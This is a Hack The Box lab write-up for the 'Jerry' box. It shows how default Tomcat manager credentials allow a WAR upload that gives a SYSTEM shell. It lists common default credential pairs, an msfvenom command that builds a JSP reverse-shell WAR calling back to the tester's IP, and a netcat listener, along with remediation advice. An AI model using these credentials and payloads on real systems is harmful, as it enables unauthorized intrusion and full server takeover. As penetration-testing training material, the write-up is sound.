---
title: HTB — Jerry
type: lab-writeup
platform: HTB
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - HTB
  - windows
  - tomcat
  - default-creds
  - war-deploy
  - web
---

# HTB — Jerry

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Jerry |
| Difficulty | Easy |
| OS | Windows Server 2012 R2 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-27 |

> **Summary:** Apache Tomcat with default credentials exposes the manager interface, allowing WAR file upload for remote code execution. Yields SYSTEM immediately.

---

## Objectives

- [x] Recon: identify web services and Tomcat version
- [x] Exploit: log in with default credentials and deploy WAR reverse shell
- [x] Capture both user and root flags (found in single file)

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/jerry_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 8080/tcp | http | Apache Tomcat 7.0.88 |

### Web enumeration

- Browsing `http://<IP>:8080` reveals default Tomcat landing page
- Clicking "Manager App" prompts for HTTP Basic Auth
- Clicking "Cancel" on the auth dialog reveals a 401 error page that leaks sample credentials

---

## Vulnerability Background

**Apache Tomcat Default/Weak Credentials** — Tomcat ships with an example `tomcat-users.xml` containing well-known username/password pairs. If administrators fail to change or remove these, the Manager interface allows authenticated deployment of arbitrary WAR applications.

| Field | Detail |
|---|---|
| Weakness | CWE-521: Weak Password Requirements / default credentials |
| Impact | Full remote code execution via WAR deployment |
| CVSS | N/A (misconfiguration, not a CVE) |
| Fix | Remove default users, enforce strong passwords, restrict manager access by IP |

---

## Foothold

### Default credential login

Common Tomcat default credential pairs to try:

```
tomcat:s3cret
admin:admin
tomcat:tomcat
admin:tomcat
role1:tomcat
```

Successful login: `tomcat` / `s3cret` grants access to `/manager/html`.

### WAR reverse shell deployment

**Generate payload:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war -o revshell.war
```

**Start listener:**

```bash
nc -lvnp 4444
```

**Deploy:**

1. Navigate to Tomcat Manager → "WAR file to deploy"
2. Upload `revshell.war`
3. Click the deployed application link (e.g., `/revshell`)
4. Reverse shell connects as `NT AUTHORITY\SYSTEM`

---

## Privilege Escalation

Not required. Tomcat is running as SYSTEM — WAR deployment yields highest privilege immediately.

---

## Post-Exploitation

### Flags

Both flags are in a single file:

```
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

| Flag | Location |
|---|---|
| User + Root | `C:\Users\Administrator\Desktop\flags\` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Default credentials remain one of the most common real-world findings — always check before complex exploitation
- Tomcat Manager with weak creds is an instant SYSTEM shell on Windows
- WAR deployment is a legitimate admin feature weaponised by attackers — restrict Manager access to localhost or trusted IPs
- `msfvenom` WAR payloads are reliable for Tomcat RCE
- Lesson: credential hygiene beats technical controls every time

---

## Tools Used

- Nmap
- Netcat
- msfvenom (payload generation)

---

## References

- [Hack The Box — Jerry](https://app.hackthebox.com/machines/Jerry)
- [Apache Tomcat Security](https://tomcat.apache.org/tomcat-7.0-doc/security-howto.html)
- [HackTricks — Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Web-Application-Testing
- Nmap
- Common-Ports
- Reverse-Shell-Cheatsheet

---
<- [[Labs-MOC]]